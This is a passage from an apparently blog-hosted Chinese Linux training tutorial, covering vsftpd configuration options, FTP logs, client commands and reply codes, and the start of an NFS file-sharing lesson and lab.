class="bash">chown_username=whoever</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设定系统维护记录FTP服务器上传和下载情况的日志文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> /var/<span class="built_in">log</span>/vsftpd.log是默认的，也可以另设其它</span></span><br><span class="line"><span class="meta">#</span><span class="bash">xferlog_file=/var/<span class="built_in">log</span>/vsftpd.log</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否以标准xferlog的格式书写传输日志文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 默认为/var/<span class="built_in">log</span>/xferlog，也可以通过xferlog_file选项对其进行设定</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 默认值为NO</span></span><br><span class="line"><span class="meta">#</span><span class="bash">xferlog_std_format=YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 以下是附加配置，添加相应的选项将启用相应的设置</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否生成两个相似的日志文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 默认在/var/<span class="built_in">log</span>/xferlog和/var/<span class="built_in">log</span>/vsftpd.log目录下</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 前者是wu_ftpd类型的传输日志，可以利用标准日志工具对其进行分析；后者是vsftpd类型的日志</span></span><br><span class="line"><span class="meta">#</span><span class="bash">dual_log_enable</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否将原本输出到/var/<span class="built_in">log</span>/vsftpd.log中的日志，输出到系统日志</span></span><br><span class="line"><span class="meta">#</span><span class="bash">syslog_enable</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置数据传输中断间隔时间，此语句表示空闲的用户会话中断时间为600秒</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 即当数据传输结束后，用户连接FTP服务器的时间不应超过600秒。可以根据实际情况对该值进行修改</span></span><br><span class="line"><span class="meta">#</span><span class="bash">idle_session_timeout=600</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置数据连接超时时间，该语句表示数据连接超时时间为120秒，可根据实际情况对其个修改</span></span><br><span class="line"><span class="meta">#</span><span class="bash">data_connection_timeout=120</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行vsftpd需要的非特权系统用户，缺省是nobody</span></span><br><span class="line"><span class="meta">#</span><span class="bash">nopriv_user=ftpsecure</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否识别异步ABOR请求。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果FTP client会下达“async ABOR”这个指令时，这个设定才需要启用</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 而一般此设定并不安全，所以通常将其取消</span></span><br><span class="line"><span class="meta">#</span><span class="bash">async_abor_enable=YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否以ASCII方式传输数据。默认情况下，服务器会忽略ASCII方式的请求。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启用此选项将允许服务器以ASCII方式传输数据</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 不过，这样可能会导致由<span class="string">"SIZE /big/file"</span>方式引起的DoS攻击</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ascii_upload_enable=YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ascii_download_enable=YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 登录FTP服务器时显示的欢迎信息</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如有需要，可在更改目录欢迎信息的目录下创建名为.message的文件，并写入欢迎信息保存后</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ftpd_banner=Welcome to blah FTP service.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 黑名单设置。如果很讨厌某些email address，就可以使用此设定来取消他的登录权限</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 可以将某些特殊的email address抵挡住。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">deny_email_enable=YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 当上面的deny_email_enable=YES时，可以利用这个设定项来规定哪些邮件地址不可登录vsftpd服务器</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 此文件需用户自己创建，一行一个email address即可</span></span><br><span class="line"><span class="meta">#</span><span class="bash">banned_email_file=/etc/vsftpd/banned_emails</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 用户登录FTP服务器后是否具有访问自己目录以外的其他文件的权限</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置为YES时，用户被锁定在自己的home目录中，vsftpd将在下面chroot_list_file选项值的位置寻找chroot_list文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 必须与下面的设置项配合</span></span><br><span class="line"><span class="meta">#</span><span class="bash">chroot_list_enable=YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 被列入此文件的用户，在登录后将不能切换到自己目录以外的其他目录</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 从而有利于FTP服务器的安全管理和隐私保护。此文件需自己建立</span></span><br><span class="line"><span class="meta">#</span><span class="bash">chroot_list_file=/etc/vsftpd/chroot_list</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否允许递归查询。默认为关闭，以防止远程用户造成过量的I/O</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ls_recurse_enable=YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否允许监听。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果设置为YES，则vsftpd将以独立模式运行，由vsftpd自己监听和处理IPv4端口的连接请求</span></span><br><span class="line">listen=YES</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设定是否支持IPV6。如要同时监听IPv4和IPv6端口，</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 则必须运行两套vsftpd，采用两套配置文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 同时确保其中有一个监听选项是被注释掉的</span></span><br><span class="line"><span class="meta">#</span><span class="bash">listen_ipv6=YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置PAM外挂模块提供的认证服务所使用的配置文件名，即/etc/pam.d/vsftpd文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 此文件中file=/etc/vsftpd/ftpusers字段，说明了PAM模块能抵挡的帐号内容来自文件/etc/vsftpd/ftpusers中</span></span><br><span class="line"><span class="meta">#</span><span class="bash">pam_service_name=vsftpd</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否允许ftpusers文件中的用户登录FTP服务器，默认为NO</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 若此项设为YES，则user_list文件中的用户允许登录FTP服务器</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 而如果同时设置了userlist_deny=YES，则user_list文件中的用户将不允许登录FTP服务器，甚至连输入密码提示信息都没有</span></span><br><span class="line"><span class="meta">#</span><span class="bash">userlist_enable=YES/NO</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置是否阻扯user_list文件中的用户登录FTP服务器，默认为YES</span></span><br><span class="line"><span class="meta">#</span><span class="bash">userlist_deny=YES/NO</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 是否使用tcp_wrappers作为主机访问控制方式。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> tcp_wrappers可以实现linux系统中网络服务的基于主机地址的访问控制</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在/etc目录中的hosts.allow和hosts.deny两个文件用于设置tcp_wrappers的访问控制</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 前者设置允许访问记录，后者设置拒绝访问记录。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如想限制某些主机对FTP服务器192.168.57.2的匿名访问，编缉/etc/hosts.allow文件，如在下面增加两行命令：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> vsftpd:192.168.57.1:DENY 和vsftpd:192.168.57.9:DENY</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 表明限制IP为192.168.57.1/192.168.57.9主机访问IP为192.168.57.2的FTP服务器</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 此时FTP服务器虽可以PING通，但无法连接</span></span><br><span class="line">tcp_wrappers=YES</span><br></pre></td></tr></table></figure>

<p>除了上述那些基本设定，我们还可以在vsftpd.conf文件中添加更多的安全选项。其中几个常用的如下：</p>
<p>限制最大连接数和传输速率</p>
<p>在FTP服务器的管理中，无论对本地用户还是匿名用户，对于FTP服务器资源的使用都需要进行控控制，避免由于负担过大造成FTP服务器运行异常，可以添加以下配置项对FTP客户机使用FTP服务器资源进行控制：</p>
<ul>
<li><code>max_client</code>设置项 用于设置FTP服务器所允许的最大客户端连接数，值为0时表示不限制。例如<code>max_client=100</code>表示FTP服务器的所有客户端最大连接数不超过100个。</li>
<li><code>max_per_ip</code>设置项 用于设置对于同一IP地址允许的最大客户端连接数，值为0时表示不限制。例如<code>max_per_ip=5</code>表示同一IP地址的FTP客户机与FTP服务器建立的最大连接数不超过5个。</li>
<li><code>local_max_rate</code>设置项 用于设置本地用户的最大传输速率，单位为B/s，值为0时表示不限制。例如<code>local_max_rate=500000</code>表示FTP服务器的本地用户最大传输速率设置为500KB/s.</li>
<li><code>anon_max_rate</code>设置项 用于设置匿名用户的最大传输速率，单位为B/s,值为0表示不限制。例如<code>ano_max_rate=200000</code>，表示FTP服务器的匿名用户最大传输速率设置为200KB/s.</li>
</ul>
<p>指定用户的权限设置</p>
<p><code>vsftpd.user_list</code>文件需要与<code>vsftpd.conf</code>文件中的配置项结合来实现对于<code>vsftpd.user_list</code>文件中指定用户账号的访问控制：</p>
<p>（1）设置禁止登录的用户账号</p>
<p>当<code>vsftpd.conf</code>配置文件中包括以下设置时，<code>vsftpd.user_list</code>文件中的用户账号被禁止进行FTP登录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">userlist_enable=YES</span><br><span class="line">userlist_deny=YES</span><br></pre></td></tr></table></figure>

<p><code>userlist_enable</code>设置项设置使用<code>vsftpd.user_list</code>文件，<code>userlist_deny</code>设置为<code>YES</code>表示<code>vsftpd.user_list</code>文件用于设置禁止的用户账号。</p>
<p>（2）设置只允许登录的用户账号</p>
<p>当vsftpd.conf配置文件中包括以下设置时，只有<code>vsftpd.user_list</code>文件中的用户账号能够进行FTP登录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">userlist_enable=YES</span><br><span class="line">userlist_deny=NO</span><br></pre></td></tr></table></figure>

<p><code>userlist_enable</code>设置项设置使用vsftpd.user_list文件，<code>userlist _deny</code>设置为<code>NO</code>表示<code>vsftpd.usre_list</code>文件用于设置只允许登录的用户账号，文件中未包括的用户账号被禁止FTP登录。</p>
<p><code>userlist_deny</code>和<code>userlist_enable</code>选项限制用户登录FTP服务器（使用<code>userlist_deny</code>选项和<code>user_list</code>文件一起能有效阻止<code>root,apache,www</code>等系统用户登录FTP服务器，从而保证FTP服务器的分级安全性）。以下是两个选项的具体表现形式和两种搭配使用方式的效果：</p>
<table>
<thead>
<tr>
<th align="left">配置</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Userlist_enable=YES</td>
<td align="left">Ftpusers中用户允许访问;User_list中用户允许访问</td>
</tr>
<tr>
<td align="left">Userlist_enable=NO</td>
<td align="left">Ftpusers中用户禁止访问;User_list中用户允许访问</td>
</tr>
<tr>
<td align="left">Userlist_deny=YES</td>
<td align="left">Ftpusers中用户禁止访问（登录时可以看到密码输入提示，但仍无法访问）;user_list 中用户禁止访问</td>
</tr>
<tr>
<td align="left">Userlist_deny=NO</td>
<td align="left">ftpusers中用户禁止访问;user_list中用户允许访</td>
</tr>
<tr>
<td align="left">Userlist_enable=YES 并且Userlist_deny=YES</td>
<td align="left">Ftpusers中用户禁止访问;User_list中用户禁止访问（登录时不会出现密码提示，直接被服务器拒绝）</td>
</tr>
<tr>
<td align="left">Userlist_enable=YES 并且Userlist_deny=NO</td>
<td align="left">Ftpusers中用户禁止访问;User_list中用户允许访问</td>
</tr>
</tbody></table>
<p>修改默认端口</p>
<p>默认FTP服务器端口号是21，出于安全目的，有时需修改默认端口号，修改/etc/vsftpd/vsftpd.conf，添加语句(例)：</p>
<p><code>listen_port=4449</code></p>
<p>语句指定了修改后FTP服务器的端口号，应尽量大于4000。修改后访问</p>
<p><code>#ftp 192.168.57.2 4449</code></p>
<p>注意这里需加上正确的端口号了，否则不能正常连接。</p>
<p>设置用户组</p>
<p>有关FTP用户和用户组的重要性，我们在之前介绍vsftpd的时候便已经提到过。这里主要是简单的说明用户组的技术实现，至于具体如何应用，还是具体需求具体对待。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /home/try  递归创建新目录</span><br><span class="line">groupadd try        新建组</span><br><span class="line">useradd -g try -d /home/try try1 新建用户try1并指定家目录和属组</span><br><span class="line">useradd -g try -d /home/try try2 新建用户try2并指定家目录和属组</span><br><span class="line">useradd -g try -d /home/try try3 新建用户try3并指定家目录和属组</span><br><span class="line">passwd try1  为新用户设密码</span><br><span class="line">passwd try2  为新用户设密码</span><br><span class="line">passwd try3  为新用户设密码</span><br><span class="line">chown try1 /home/try 设置目录属主为用户try1</span><br><span class="line">chown .try /home/try 设置目录属组为组try</span><br><span class="line">chmod 750 /home/try  设置目录访问权限try1为读，写，执行；try2，try3为读，执行</span><br></pre></td></tr></table></figure>

<p>由于本地用户登录FTP服务器后进入自己主目录，而try1,try2 try3对主目录/home/try分配的权限不同，所以通过FTP访问的权限也不同，try1访问权限为：上传，下载，建目录；try2，try3访问权限为下载，浏览，不能建目录和上传。实现了群组中用户不同访问级别，加强了对FTP服务器的分级安全管理。</p>
<p>连接超时（本部分内容由李洋提供）</p>
<p>配置空闲的用户会话的中断时间：如下配置将在用户会话空闲5分钟后被中断，以释放服务器的资源</p>
<p><code>Idle_session_timeout=300</code></p>
<p>配置空闲的数据连接的中断时间：如下配置将在数据空闲连接1分钟后被中断，同样也是为了释放服务器的资源</p>
<p><code>Data_connection_timeout=60</code></p>
<p>配置客户端空闲时的自动中断和激活连接的时间：如下配置将使客户端空闲1分钟后自动中断连接，并在30秒后自动激活连接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Accept_timeout=60</span><br><span class="line">Connect_timeout=30</span><br></pre></td></tr></table></figure>

<h5 id="vsftpd的日志"><a href="#vsftpd的日志" class="headerlink" title="vsftpd的日志"></a>vsftpd的日志</h5><p>常见的vsftpd日志解决方案</p>
<p>在vsftpd.conf中有如下内容定义了日志的记录方式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 表明FTP服务器记录上传下载的情况</span></span><br><span class="line">xferlog_enable=YES</span><br><span class="line"><span class="meta">#</span><span class="bash"> 表明将记录的上传下载情况写在xferlog_file所指定的文件中，即xferlog_file选项指定的文件中</span></span><br><span class="line">xferlog_std_format=YES</span><br><span class="line">xferlog_file=/var/log/xferlog</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启用双份日志。在用xferlog文件记录服务器上传下载情况的同时，</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> vsftpd_log_file所指定的文件，即/var/<span class="built_in">log</span>/vsftpd.log也将用来记录服务器的传输情况</span></span><br><span class="line">dual_log_enable=YES</span><br><span class="line">vsftpd_log_file=/var/log/vsftpd.log</span><br></pre></td></tr></table></figure>

<p>vsftpd的两个日志文件分析如下：</p>
<p>/var/log/xferlog</p>
<p>记录内容举例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Thu Sep 6 09:07:48 2007 7 192.168.57.1 4323279 /home/student/phpMyadmin-2.11.0-all-languages.tar.gz b -i r student ftp 0 * c</span><br></pre></td></tr></table></figure>

<p>/var/log/vsftpd.log</p>
<p>记录内容举例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Tue Sep 11 14:59:03 2007 [pid 3460]    CONNECT: Client "127.0.0.1"</span><br><span class="line">Tue Sep 11 14:59:24 2007 [pid 3459] [ftp] OK LOGIN;Client "127.0.0.1" ,anon password ”</span><br></pre></td></tr></table></figure>

<p>/var/log/xferlog日志文件中数据的分析和参数说明</p>
<p>|记录数据|参数名称|参数说明|<br>|Thu Sep 6 09:07:48 2007|当前时间|当前服务器本地时间，格式为： DDD MMM dd hh:mm:ss YYY|<br>|7|传输时间|传送文件所用时间，单位为秒|<br>|192.168.57.1|远程主机名称/IP|远程主机名称/IP|<br>|4323279|文件大小|传送文件的大小，单位为byte|<br>|/home/student/phpMyadmin-2.11.0-all-languages.tar.gz|文件名|传输文件名，包括路径|<br>|b|传输类型|传输方式的类型，包括两种：a以ASCII传输 b以二进制文件传输|<br>|–|特殊处理标志|特殊处理的标志位，可能的值包括：_ 不做任何特殊处理；C 文件是压缩格式；U 文件是非压缩格式；T 文件是tar格式|<br>|i|传输方向|文件传输方向，包括两种：o 从FTP服务器向客户端传输；i 从客户端向FTP服务器传输|<br>|r|访问模式|用户访问模式，包括：a 匿名用户；g 来宾用户；r 真实用户，即系统中的用户|<br>|student|用户名|用户名称|<br>|ftp|服务名|所使用的服务名称，一般为FTP|<br>|0|认证方式|认证方式，包括：0 无；1 RFC931认证|<br>|<em>|认证用户id|认证用户的id，如果使用</em>，则表示无法获得该id|<br>|c|完成状态|传输的状态：c 表示传输已完成；i 表示传输示完成|</p>
<h5 id="常见的FTP命令，以及FTP数字代码的意义"><a href="#常见的FTP命令，以及FTP数字代码的意义" class="headerlink" title="常见的FTP命令，以及FTP数字代码的意义"></a>常见的FTP命令，以及FTP数字代码的意义</h5><p>命令格式如下显示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FTP命令</span><br><span class="line">  	功能</span><br><span class="line">  	FTP命令</span><br><span class="line">  	功能</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">	显示服务器上的目录</span><br><span class="line">  	ls [remote-dir][local-file]</span><br><span class="line">  	显示远程目录remote-dir，并存入本地文件local-file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get remote-file [local-file]</span><br><span class="line">	从服务器下载指定文件到客户端</span><br><span class="line">  	mget remote-files</span><br><span class="line">  	下载多个远程文件(mget命令允许用通配符下载多个文件)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put local-file [remote-file]</span><br><span class="line">	从客户端上传指定文件到服务器</span><br><span class="line">  	mput local-file</span><br><span class="line">  	将多个文件上传至远程主机(mput命令允许用通配符上传多个文件)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">open</span><br><span class="line">	连接FTP服务器</span><br><span class="line">  	mdelete [remote-file]</span><br><span class="line">  	删除远程主机文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">close</span><br><span class="line">	中断与远程服务器的ftp会话（与open对应）</span><br><span class="line">  	mkdir dir-name</span><br><span class="line">  	在远程主机中创建目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">open host[port]</span><br><span class="line">	建立指定的ftp服务器连接，可指定连接端口</span><br><span class="line">  	newer file-name</span><br><span class="line">  	如果远程主机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd directory</span><br><span class="line">	改变服务器的工作目录</span><br><span class="line">  	rename [from][to]</span><br><span class="line">  	更改远程主机的文件名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lcd directory</span><br><span class="line">	在客户端上(本地)改变工作目录</span><br><span class="line">  	pwd</span><br><span class="line">  	显示远程主机的当前工作目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bye</span><br><span class="line">	退出FTP命令状态</span><br><span class="line">  	quit</span><br><span class="line">  	同bye,退出ftp会话</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ascii</span><br><span class="line">	设置文件传输方式为ASCII模式</span><br><span class="line">  	reget remote-file [local-file]</span><br><span class="line">  	类似于get,但若local-file存在，则从上次传输中断处续传</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary</span><br><span class="line">	设置文件传输方式为二进制模式</span><br><span class="line">  	rhelp [cmd-name]</span><br><span class="line">  	请求获得远程主机的帮助</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![cmd [args]]</span><br><span class="line">	在本地主机中交互shell后退回到ftp环境，如:!ls *.zip</span><br><span class="line">  	rstatus [file-name]</span><br><span class="line">  	若未指定文件名，则显示远程主机的状态，否则显示文件状态</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">accout [password]</span><br><span class="line">	提供登录远程系统成功后访问系统资源所需的密码</span><br><span class="line">  	hash</span><br><span class="line">  	每传输1024字节，显示一个hash符号（#）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">append local-file [remote-file]</span><br><span class="line">	将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名</span><br><span class="line">  	restart marker</span><br><span class="line">  	从指定的标志marker处，重新开始get或put，如restart 130</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bye</span><br><span class="line">	退出ftp会话过程</span><br><span class="line">  	rmdir dir-name</span><br><span class="line">  	删除远程主机目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">case</span><br><span class="line">	在使用mget命令时，将远程主机文件名中的大写转为小写字母</span><br><span class="line">  	size file-name</span><br><span class="line">  	显示远程主机文件大小，如：</span><br><span class="line">size idle 7200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd remote-dir</span><br><span class="line">	进入远程主机目录</span><br><span class="line">  	status</span><br><span class="line">  	显示当前ftp状态</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cdup</span><br><span class="line">	进入远程主机目录的父目录</span><br><span class="line">  	system</span><br><span class="line">  	显示远程主机的操作系统</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete remote-file</span><br><span class="line">	删除远程主机文件</span><br><span class="line">  	user user-name [password][account]</span><br><span class="line">  	向远程主机表明自己的身份，需要密码时，必须输入密码，如:user anonymous my@email</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dir [remote-dir][local-file]</span><br><span class="line">	显示远程主机目录，并将结果存入本地文件</span><br><span class="line">  	help [cmd]</span><br><span class="line">  	显示ftp内部命令cmd的帮助信息，如help get</span><br></pre></td></tr></table></figure>

<p><strong>FTP数字代码的意义</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">110 重新启动标记应答。</span><br><span class="line">120 服务在多久时间内ready。</span><br><span class="line">125 数据链路端口开启，准备传送。</span><br><span class="line">150 文件状态正常，开启数据连接端口。</span><br><span class="line">200 命令执行成功。</span><br><span class="line">202 命令执行失败。</span><br><span class="line">211 系统状态或是系统求助响应。</span><br><span class="line">212 目录的状态。</span><br><span class="line">213 文件的状态。</span><br><span class="line">214 求助的讯息。</span><br><span class="line">215 名称系统类型。</span><br><span class="line">220 新的联机服务ready。</span><br><span class="line">221 服务的控制连接端口关闭，可以注销。</span><br><span class="line">225 数据连结开启，但无传输动作。</span><br><span class="line">226 关闭数据连接端口，请求的文件操作成功。</span><br><span class="line">227 进入passive mode。</span><br><span class="line">230 使用者登入。</span><br><span class="line">250 请求的文件操作完成。</span><br><span class="line">257 显示目前的路径名称。</span><br><span class="line">331 用户名称正确，需要密码。</span><br><span class="line">332 登入时需要账号信息。</span><br><span class="line">350 请求的操作需要进一部的命令。</span><br><span class="line">421 无法提供服务，关闭控制连结。</span><br><span class="line">425 无法开启数据链路。</span><br><span class="line">426 关闭联机，终止传输。</span><br><span class="line">450 请求的操作未执行。</span><br><span class="line">451 命令终止:有本地的错误。</span><br><span class="line">452 未执行命令:磁盘空间不足。</span><br><span class="line">500 格式错误，无法识别命令。</span><br><span class="line">501 参数语法错误。</span><br><span class="line">502 命令执行失败。</span><br><span class="line">503 命令顺序错误。</span><br><span class="line">504 命令所接的参数不正确。</span><br><span class="line">530 未登入。</span><br><span class="line">532 储存文件需要账户登入。</span><br><span class="line">550 未执行请求的操作。</span><br><span class="line">551 请求的命令终止，类型未知。</span><br><span class="line">552 请求的文件终止，储存位溢出。  </span><br><span class="line">553 未执行请求的的命令，名称不正确。</span><br></pre></td></tr></table></figure>

<h3 id="项目实践"><a href="#项目实践" class="headerlink" title="项目实践"></a>项目实践</h3><ol>
<li>设置vsftpd服务匿名用户能够对/var/ftp/test/目录有上传下载的权限。</li>
<li>系统用户能够访问家目录，上传下载删除</li>
<li>除了系统用户batman有chroot的权限，其他系统用户没有chroot的权限</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="pic/05.png" alt="05"></p>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux简易服务教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux基础服务</tag>
      </tags>
  </entry>
  <entry>
    <title>NFS文件共享服务</title>
    <url>/2016/12/23/booboo_easy_service/03_nfs/</url>
    <content><![CDATA[<h3 id="NFS是什么"><a href="#NFS是什么" class="headerlink" title="NFS是什么"></a>NFS是什么</h3><p>NFS（Network File System）即网络文件系统，SUN公司开发的,是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。</p>
<h3 id="NFS的原理"><a href="#NFS的原理" class="headerlink" title="NFS的原理"></a>NFS的原理</h3><p>假设我们有一个服务器，两个客户端。客户端可以将网络中的NFS服务器共享的目录挂载到本地端的文件系统中，而在本地端的系统中看来，那个远程主机的目录就好像自己的一个磁盘分区一样。</p>
<p>比如将配置好的NFS服务器上的<code>/var/share/student1</code>目录挂在到A客户端的<code>/home/share/student1</code>上面，那在客户端A上面进入<code>/home/share/student1</code>内，就可以看到NFS服务器系统中<code>/var/share/student1</code>目录下所有的内容了，并且可以执行<code>cd，cp，mv，rm</code>等命令。当然，权限要足够。这个<code>/var/share/student1</code>就好像NFS客户端的一个文件系统一样。所以，NFS也可以简单的看做是一个文件服务器（file system）</p>
<p>只要权限足够，客户端也可以对该目录下的内容进行读写操作等等。</p>
<p><strong>NFS指的是一种服务</strong> 既然是服务，肯定会用到一些监听端口，那NFS用的是什么端口进行数据传输的？我也不知道，谁都不知道。基本上NFS这个服务的端口开在2049端口，但由于文件系统非常复杂，NFS支持的功能又相当的多，每一个功能就会启用一些端口来传输数据，所以，NFS需要调用额外的端口，那额外的端口号又是什么呢？额外的端口号并不固定。因为NFS默认传输的端口是随机取用未被使用的小于1024的端口用于传输。但如此一来，客户端连接服务器又成了问题，客户端并不知道我要链接那些端口。这时候就需要用到远程过程调用RPC服务了 remote procedure call。</p>
<p>RPC就是指定NFS各功能对应的端口号，然后通知给客户端，让客户端可以连接到正确的端口上。</p>
<p><img src="pic/20.png" alt="20"></p>
<p>对于服务端来说，在NFS启动的时候，会自动向RPC注册其各个功能所需要的随机端口号，让RPC了解NFS各项功能的端口号，PID，NFS所监听的IP等等。当客户端通过111端口号向server端RPC发出NFS访问请求时候，RPC就会找到对应已注册的端口号，并返还给客户端，客户端就可以通过这些端口号与NFS发起链接。比如说我是NFS，我在启动的时候，就会告诉RPC，我的A端口用于做什么事情，我的B端口用于做什么事情，RPC就会将其端口注册信息登记，等客户端发起请求的时候就可以直接找到RPC，而不是直接找我NFS，RPC可以直接告知客户端所需请求对应的正确的端口号。</p>
<p>当客户端执行操作文件系统的各项命令时候，会转交给客户端的RPC，客户端RPC负责接受各个程序与对应的端口后负责对主机进行解析。所以要使用NFS时，无论是客户端还是服务端，都需要启动RPC。</p>
<p>启动NFS之前，RPC就要先启动了，不然NFS无法向RPC注册，并且，RPC重启以后，原来注册的数据就没有了，所以RPC重新启动后，NFS也要重启，重新想RPC注册才行。</p>
<p>同样，A客户端对NFS服务器上的共享文件进行了修改后，B服务器能看到改后的文件，也就完成了各个主机之间文件的共享。所以如果重启了rpc，nfs也必须要重新启动，以便于重新像rpc注册相应的端口号。</p>
<ul>
<li>NFS：处理客户端数据请求，</li>
<li>RPC：处理客户端链接请求。</li>
</ul>
<h3 id="NFS的用处"><a href="#NFS的用处" class="headerlink" title="NFS的用处"></a>NFS的用处</h3><ul>
<li>存储共享方案</li>
<li>网络共享文件系统</li>
</ul>
<h3 id="项目实践1：配置NFS网络共享文件服务器"><a href="#项目实践1：配置NFS网络共享文件服务器" class="headerlink" title="项目实践1：配置NFS网络共享文件服务器"></a>项目实践1：配置NFS网络共享文件服务器</h3><p>要求rhel7 172.25.X.10 作为NFS网络共享文件服务器：</p>
<ol>
<li>允许172.25.X.11这个客户端来挂接使用/tmp目录，有读写权限。</li>
<li>将读写权限改成只读权限；(ro)</li>
<li>允许172.25.X.0/24网段挂接/tmp目录，有读写权限；</li>
<li>服务器上创建uid=1200的用户tom，并使用tom用户创建/tmp/tomfile；在客户端创建uid=1200的用户jack，尝试去删除tomfile目录;</li>
<li>为什么不建议使用(rw,no_root_squash)</li>
</ol>
<h5 id="实验准备阶段"><a href="#实验准备阶段" class="headerlink" title="实验准备阶段"></a>实验准备阶段</h5><ol>
<li>网络拓扑图</li>
<li>规划软件安装</li>
<li>修改配置文件</li>
<li>启动服务</li>
<li>客户端测试服务        </li>
</ol>
<blockquote>
<p>网络拓扑图</p>
</blockquote>
<p><img src="pic/12.png" alt="12"></p>
<blockquote>
<p>规划软件安装</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">主机名</th>
<th align="left">ip地址</th>
<th align="left">软件</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">rhel6</td>
<td align="left">172.25.0.11</td>
<td align="left">rpcbind nfs-utils</td>
<td align="left">服务端</td>
</tr>
<tr>
<td align="left">rhel7</td>
<td align="left">172.25.0.10</td>
<td align="left">rpcbind nfs-utils</td>
